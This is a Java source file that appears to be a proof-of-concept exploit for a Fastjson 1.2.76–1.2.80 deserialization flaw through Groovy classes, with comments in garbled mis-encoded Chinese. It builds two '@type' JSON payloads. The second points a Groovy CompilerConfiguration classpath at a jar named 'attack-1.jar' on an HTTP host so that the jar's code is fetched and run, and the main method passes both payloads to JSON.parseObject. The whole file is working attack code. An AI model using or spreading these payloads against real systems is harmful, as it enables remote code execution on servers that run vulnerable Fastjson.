package test;
import com.alibaba.fastjson.JSON;

public class Fastjson17_groovy {
    public static void main(String[] args){

        //“¿¿µ1.2.76-1.2.80£¨“¿¿µgroovy
    	//jar∞¸–¥∑®º˚https://github.com/Lonely-night/fastjsonVul/tree/7f9d2d8ea1c27ae1f9c06076849ae76c25b6aff7
    	String poc1 = "{\n" +
                "    \"@type\":\"java.lang.Exception\",\n" +
                "    \"@type\":\"org.codehaus.groovy.control.CompilationFailedException\",\n" +
                "    \"unit\":{}\n" +
                "}";
        String poc2 = "{\n" +
                "    \"@type\":\"org.codehaus.groovy.control.ProcessingUnit\",\n" +
                "    \"@type\":\"org.codehaus.groovy.tools.javac.JavaStubCompilationUnit\",\n" +
                "    \"config\":{\n" +
                "        \"@type\":\"org.codehaus.groovy.control.CompilerConfiguration\",\n" +
                "        \"classpathList\":\"http://127.0.0.1:81/attack-1.jar\"\n" +
                "    }\n" +
                "}";
        System.out.println(poc1);
        System.out.println(poc2);
        try {
        	JSON.parseObject(poc1);
		} catch (Exception e) {}
        JSON.parseObject(poc2);
    }
}
